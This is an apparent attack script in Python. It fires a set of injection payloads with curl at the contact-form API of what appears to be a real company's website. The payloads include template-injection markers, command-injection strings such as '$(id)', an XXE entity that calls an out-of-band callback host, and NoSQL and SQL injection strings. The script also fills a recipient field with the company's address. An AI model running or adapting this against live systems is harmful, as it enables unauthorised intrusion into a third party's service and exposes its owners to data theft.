import subprocess, urllib.parse

B = "https://www.infinitycapital.bh/api/send"
OOB = "ooba9df31e7c187.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"

def post(fields, msg, tag):
    args = ["curl", "-sk", "--max-time", "35", "-X", "POST", B,
           "-F", "fname=" + fields.get("fname", "T"),
           "-F", "lname=User", "-F", "areacode=0", "-F", "tel=123456",
           "-F", "cname=probe", "-F", "subject=Inquiry", "-F", "msg=" + msg,
           "-F", "check=yes", "--form-string", "targets=info@infinitycapital.bh"]
    r = subprocess.run(args, capture_output=True, text=True)
    out = r.stdout.strip()
    print(f"[{tag}] -> {out[:200] if out else '(empty body)'}")
    return out

# SSTI / CMDi / XXE markers through the free-text msg field
tests = {
 "ssti_arith":  "${7*7}",
 "ssti_jinja":  "{{7*7}}",
 "ssti_njk":    "#{7*7}",
 "cmdi_semi":   ";id;",
 "cmdi_pipe":   "|id|",
 "cmdi_bt":     "`id`",
 "cmdi_dollar": "$(id)",
 "xxe_entity":  '<!DOCTYPE r [<!ENTITY x SYSTEM "http://' + OOB + '/xxe_msg">]><r>&x;</r>',
 "nosqli_ne":   '{"$ne":null}',
 "sqli_uni":    "' OR '1'='1",
 "sqli_dash":   "1-1",
}
for k, v in tests.items():
    post({}, v, k)

# OOB via the recipient / header-ish fields too
post({}, "normal", "baseline")
